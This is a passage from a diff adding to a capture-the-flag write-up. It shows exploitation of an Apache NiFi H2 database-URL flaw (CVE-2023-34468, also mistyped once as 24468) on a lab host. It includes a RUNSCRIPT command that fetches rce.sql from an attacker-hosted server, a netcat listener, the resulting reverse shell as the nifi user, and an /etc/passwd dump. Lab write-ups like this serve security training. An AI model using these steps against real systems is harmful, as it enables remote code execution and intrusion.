@@ -43,3 +43,62 @@ When we access the URL we actually bypass any sort of login required for an `Apa
 In fact the user access to the backend site gives us dangerous read/write permissions to the UI board which could be used to escalate permissions. We can do some research and come up with [CVE-2023-24468](https://github.com/mbadanoiu/CVE-2023-34468). 
 
 TLDR; The DBCPConnectionPool and HikariCPConnectionPool Controller Services in Apache NiFi 0.0.2 through 1.21.0 allow an authenticated and authorized user to configure a Database URL with the H2 driver that enables custom code execution. Leading to an RCE and reverse shell.
+
+There is a PDF file within the GitHub PoC provided and we can follow that to a tee. 
+
+We need to first copy the `rce.sql` code from the [PDF](https://github.com/mbadanoiu/CVE-2023-34468/blob/main/Apache%20NiFi%20-%20CVE-2023-34468.pdf) (Tailored code provided) and follow the corresponding steps:
+
+Right-Click ExecuteSQL -> Configure -> PROPERTIES tab -> SQL select query -> paste the following:
+
+```
+RUNSCRIPT FROM 'http://<attacker-ip>:4444/rce.sql'
+```
+
+We can then make sure that we are hosting a Python `http.server` in the same directory as our `rce.sql` file
+
+```
+┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/Helix]
+└─# python3 -m http.server 4444
+Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
+```
+
+In a separate terminal we can setup our listener
+
+```
+┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/Helix]
+└─# nc -lvnp 5555           
+listening on [any] 5555 ...
+```
+
+We can then execute the `ExecuteSQL` processor and watch it connect to our machine.
+
+```
+┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/Helix]
+└─# python3 -m http.server 4444
+Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
+10.129.2.106 - - [22/May/2026 17:35:37] "GET /rce.sql HTTP/1.1" 200 -
+
+┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/Helix]
+└─# nc -lvnp 5555           
+listening on [any] 5555 ...
+connect to [10.10.16.65] from (UNKNOWN) [10.129.2.106] 57412
+bash: cannot set terminal process group (966): Inappropriate ioctl for device
+bash: no job control in this shell
+nifi@helix:/opt/nifi-1.21.0$ 
+```
+
+Success. We've obtained a reverse shell onto the nifi's connection to the backend system. We can upgrade job control in the shell to make our job easier. Read more [here](https://medium.com/@Thigh_GoD/how-to-automatically-upgrade-a-dumb-reverse-shell-6a4cb5c44997).
+
+We can now enumerate the system for any local vulnerabilites or left clues as to where to look to further escalate privileges. Checking the `/etc/passwd` file gives us some clues.
+
+```
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+operator:x:1001:1001::/home/operator:/bin/bash
+nifi:x:998:998::/opt/nifi:/usr/sbin/nologin
+plc:x:997:997::/opt/ot:/usr/sbin/nologin
+_laurel:x:996:996::/var/log/laurel:/bin/false
+```
+
+Theres a user named `operator` 
